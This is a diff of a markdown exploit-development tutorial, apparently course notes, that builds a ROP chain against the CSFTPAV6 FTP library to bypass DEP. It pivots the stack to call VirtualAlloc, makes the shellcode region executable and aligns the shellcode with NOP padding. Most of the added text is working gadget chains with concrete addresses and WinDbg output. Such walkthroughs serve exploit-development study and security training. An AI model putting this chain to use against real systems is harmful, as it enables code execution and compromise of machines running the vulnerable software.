@@ -360,7 +360,6 @@ Here we have substracted EAX 210 bytes (dummy quantity). Once we know the exact 
 
 **Note: See how we have reused several gadgets for this section! Not only gadgets, but also the value of the registers that are already stored due to prior gadget chains.**
 
-
 # Patching arguments to VirtualAlloc
 We have successfully created and executed a partial ROP chain that locates the address of VirtualAlloc from the IAT and the shellcode address, and then updates the API call skeleton on the stack.
 
@@ -464,14 +463,14 @@ bp 0x5051579a ".if (@eax & 0x0`ffffffff) = 0x80808080 {} .else {gc}"
 The last argument is the new memory protection value, which, in essence, is what allows us to bypass DEP. We want the enum PAGE_EXECUTE_READWRITE, which has the numerical value 0x40.
 In order to write that to the stack, we will reuse the same technique we did for flAllocationType.
 As it has null bytes (0x00000040) we have to do the neg trick. Let's find out the value:
-```
+```c
 0:063> ? 40 - 80808080
 Evaluate expression: -2155905088 = ffffffff`7f7f7fc0
 0:063> ? 80808080 + 7f7f7fc0
 Evaluate expression: 4294967360 = 00000001`00000040
 ```
 According to the additions, we can use the values 0x80808080 and 0x7f7f7fc0 to obtain the desired value of 0x40. This would be the ROP chain to patch flProtect, doing everything we have done for the other variables (EIP increment, setting up the operations and patching the value in the address):
-```
+```c
 rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
 rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
 rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret  
@@ -484,7 +483,7 @@ rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
 rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
 ```
 **Note: We have finished our full exploit with all the gadgets. A recommendation is to add the following gadget that will make a software breakpoint, in order to execute the entire ROP chain and catch the execution flow jut after the flProtect value has been patched:**
-```
+```c
 rop += pack("<L", (0x5051e4db)) # int3 ; push eax ; call esi
 ```
 Note that only int3 will be executed, the other instructions will get paused. Remember to remove it after inspecting that everything works:
@@ -507,3 +506,184 @@ CSFTPAV6!FtpUploadFileW+0xd63d:
 0184e304  00000040
 ```
 As we can see in ESI and lower locations the prepared call stack for the VirtualAlloc function has been prepared. We have the correct address for VirtualAlloc, the return address, and the four parameters: lpAddress, dwSize, flAllocationType and lpProtect.
+
+# Fixing ESP to execute VirtualAlloc
+The ROP chain to set up the address for VirtualAlloc, the return address, and all four arguments has been created and verified to work. The only step that remains to bypass DEP is to invoke the API.
+In order to invoke the API, we must jump to the "VirtualAlloc" address in the stack.
+How do we jump? By forcing ESP to point to such address and then performing a ret instruction (ret single gadget).
+In order to force ESP to point to such address, we must perform a ROP chain to move ESP here:
+```
+0:055> dds esi - 14
+0184e2f0  76c05680 KERNEL32!VirtualAllocStub <- ESP SHOULD POINT HERE
+0184e2f4  0184e504
+0184e2f8  0184e504
+0184e2fc  00000001
+0184e300  00001000
+0184e304  00000040
+```
+
+**Note that the return address and lpAddress do not point to our shellcode yet. We need to fix these values later. Let's focus on the ROP chain needed to ESP to point to this address.** 
+
+Sadly, there is no simple way to modify ESP, so we must take a small detour. The only useful gadget we found for this task is a MOV ESP, EBP ; POP EBP ; RET. 
+However, this is only useful is EBP previously points to our VirtualAlloc address in the stack.
+Let's force EBP to point to our VirtualAlloc address.
+
+First, we must remember that when the ROP chain has been finished patching the arguments of VirtualAlloc, ESI will contain the address of the last parameter (flProtect). We can use this address and substract the bytes from this address to the address of VirtualAlloc in the stack.
+Any small value will contain null bytes, so instead we can leverage the fact that when 32-bit registers overflow, any bits higher than 32 will be discarded. Instead of subtracting a small value that contains null bytes, we can add a large value. This will allow us to align EAX with the VirtualAlloc address on the stack.
+**Note: If you have to add a value to another one, in 32 bits you can abuse the fact that adding a large value will overflow. Sometimes adding a large value is the same as adding a small value (with badchars). Only 32 bits.**
+
+Therefore, what we will do is:
+- Use EIP that is near our desired address.
+- Move EIP to EAX
+- Substract some bytes to EAX to reach our desired address in the stack (**Note**: we do this in EAX as there are more gadgets with EAX).
+- Move EAX to EBX
+- Move EBX to ESP
+
+We have to move EAX to EBX and then EBX to ESP as there are not direct gadgets. Therefore, we have to play a bit with the registers.
+
+The gadget that moves EBP into ESP has a side effect of popping a value into EBP. We must compensate for this and configure the stack so that a dummy DWORD just before the VirtualAlloc address is popped into EBP.
+
+The gadget chain to move ESP to our desired address is the following:
+```c
+# Put ESP to point to VirtualAlloc address in stack.  
+# In order to set ESP, we need gadgets that operate with ESI, EAX, ECX, EBP and finally ESP.  
+# There are not direct pop esp gadgets or similar.  
+rop += pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn  
+rop += pack("<L", (0x42424242)) # junk  
+rop += pack("<L", (0x505115a3)) # pop ecx ; ret  
+rop += pack("<L", (0xffffffe8)) # negative offset value  
+rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret  
+rop += pack("<L", (0x5051571f)) # xchg eax, ebp ; ret  
+rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret
+```
+Through trial and error, we find that we want to subtract 0x18 bytes from EAX to obtain the correct stack pointer alignment, which means we must add 0xffffffe8 bytes (same as substracting 0x18 bytes).
+Note that we put ESP **before the VirtualAlloc address as we end doing a POP EBP gadget**.
+**Note: In this case we reused a value that was in the stack so we pointed EBP 4 bytes higher and we made a pop instruction so ESP is decremented and EBP takes such value. We cant do the strategy of putting other value as the next in the gadget chain as we are doing a mov esp, which means that esp is not going to point anymore to our rop gadget! remember that moving ESP means that we lose control of our gadgets. So we have to do the offset-4**
+
+Now, we can put a breakpoint on any of the latest gadgets we added. 
+**Note: as the gadget has been used several times, and we know EAX value is 0x40 after patching flProtect, we can set a conditional breakpoint to stop on that gadget address if EAX is 0x40:**
+```c
+bp 0x5050118e ".if @eax = 0x40 {} .else {gc}"
+```
+
+We can see that we stop just after patching flProtect:
+```c
+0:079> g
+eax=00000040 ebx=05e4b220 ecx=7f7f7fc0 edx=77182da0 esi=00fce304 edi=00000000
+eip=5050118e esp=00fce40c ebp=51515151 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+CSFTPAV6+0x118e:
+5050118e 8bc6            mov     eax,esi
+```
+
+Let's execute the ROP chain and see where ESP points to:
+```c
+0:004> p
+eax=51515151 ebx=0668b1c8 ecx=ffffffe8 edx=77182da0 esi=42424242 edi=00000000
+eip=50533cbf esp=026ce424 ebp=026ce2ec iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+CSFTPAV6!FtpUploadFileW+0x22e21:
+50533cbf 8be5            mov     esp,ebp
+0:004> p
+eax=51515151 ebx=0668b1c8 ecx=ffffffe8 edx=77182da0 esi=42424242 edi=00000000
+eip=50533cc1 esp=026ce2ec ebp=026ce2ec iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+CSFTPAV6!FtpUploadFileW+0x22e23:
+50533cc1 5d              pop     ebp
+0:004> dd esp
+026ce2ec  41414141 76a65680 026ce504 026ce504
+```
+
+We can see that the last pop ebp gadget we put is going to pop 41414141 (one of the dummy values we have inserted to reach EIP) into ebp and then esp is going to point to our desired address.:
+```c
+0:004> dd esp L1
+026ce2f0  76a65680
+0:004> p
+eax=51515151 ebx=0668b1c8 ecx=ffffffe8 edx=77182da0 esi=42424242 edi=00000000
+eip=76a65680 esp=026ce2f4 ebp=41414141 iopl=0         nv up ei pl nz na po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
+KERNEL32!VirtualAllocStub:
+76a65680 8bff            mov     edi,edi
+```
+
+Now let's see our shellcode address (top of stack, we are going to return to it after VirtualAlloc, remember we placed it on purpose). Let's see the protections:
+```c
+0:055> dd esp
+01a0e2f4  01a0e504 01a0e504 00000001 00001000
+0:055> !vprot 01a0e504 
+BaseAddress:       01a0e000
+AllocationBase:    01970000
+AllocationProtect: 00000004  PAGE_READWRITE
+RegionSize:        00062000
+State:             00001000  MEM_COMMIT
+Protect:           00000004  PAGE_READWRITE
+Type:              00020000  MEM_PRIVATE
+```
+Let's execute VirtualProtect and see the protections again (we use pt here to stop until next return).
+```c
+0:055> pt
+eax=01a0e000 ebx=05d4a7e8 ecx=01a0e2c4 edx=77182da0 esi=42424242 edi=00000000
+eip=755ddf31 esp=01a0e2f4 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+KERNELBASE!VirtualAlloc+0x51:
+755ddf31 c21000          ret     10h
+0:055> !vprot 01a0e504 
+BaseAddress:       01a0e000
+AllocationBase:    01970000
+AllocationProtect: 00000004  PAGE_READWRITE
+RegionSize:        00001000
+State:             00001000  MEM_COMMIT
+Protect:           00000040  PAGE_EXECUTE_READWRITE
+Type:              00020000  MEM_PRIVATE
+```
+Before executing the API, we find that the memory protection is PAGE_READWRITE. But after executing the API, we observe that it is now the desired PAGE_EXECUTE_READWRITE.
+
+# Aligning the shellcode with our return address
+The final step is to align our shellcode with the return address. 
+Note: Instead of modifying the offsets used in the ROP chain (would be another method, once we know the offset, modify it) we could also insert several padding bytes before the shellcode. 
+We will do the second approach here.
+
+To find the number of padding bytes we need, we return out of VirtualAlloc and obtain the **address of the first instruction we are executing on the stack.** 
+Next, we dump the contents of the stack and **obtain the address of where our ROP chain ends in order to obtain its address and calculate the difference between the two.**
+We are basically forcing our shellcode to be in the address that we previously inserted in the ROP gadget chain. We just calculate the bytes that are missing from such address and add NOPs so that the shellcode starts in such address instead of just after the ROP chain.
+**Note: In Windows, the calling convention enforces that the called function decrements ESP to clear the stack arguments.** In Linux, the caller function clears the argument after the flow its returned to it (with add esp, 8). Basically, windows does the "add esp" in the ret.
+En español para que quede más claro: Al setear ESP con el dummy address que hemos puesto en el rop chain, ESP está muy abajo (o arriba) de nuestro shellcode. Nuestro shellcode en realidad está mas arriba (o abajo) de la pila. Hay que ver la diferencia en bytes y añadir NOPs para que la dirección de salto que hemos puesto en la ROP chain coincida justo donde empieza nuestro shellcode.
+
+Let's see where we landed after executing VirtualAlloc:
+```c
+0:055> p
+eax=01a0e000 ebx=05d4a7e8 ecx=01a0e2c4 edx=77182da0 esi=42424242 edi=00000000
+eip=01a0e504 esp=01a0e308 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+01a0e504 43              inc     ebx
+```
+eip = 0x01a0e504.
+We can subtly see as the next instruction to execute is "43" meaning that we are jumping "inside" our shellcode. We have to jump to the start.
+
+Let's see where does our ROP chain start:
+```c
+0:055> dd esp + 100
+01a0e408  5050118e 42424242 505115a3 ffffffe8
+01a0e418  5051579a 5051571f 50533cbf 43434343
+
+0:055> db 01a0e424
+01a0e424  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+```
+
+Our shellcode starts in 0x01a0e424. Let's calculate the offset from EIP:
+```
+0:055> ? 0x01a0e424 - 0x01a0e504
+Evaluate expression: -224 = ffffff20
+```
+This means that we have to add 224 NOPs into our shellcode so the first starting byte is at address 0x01a0e504.
+Our buffer starts fulfilling at 0x01a0e424, we will fill 224 nops and then the useful payload.
+**Note: the offset dummy value that we store in the stack must not be very big as it is better to have a small offset and then fix by adding NOPs in our shellcode rather than jumping further than our shellcode. The offset must be inside our shellcode, that's for sure, so we can put nops and fix it afterwards. If not, we have to change the offset manually.**
+
+After sending the payload with the exact offset, we can see that EIP points to exactly our shellcode:
+```c
+0:004> dds eip
+024de504  cccccccc
+0:004> dds eip - 1
+024de503  cccccc43
+```
+**Note: the instruction CC (int 3, software breakpoint) has been executed in order to verify that everything works.**
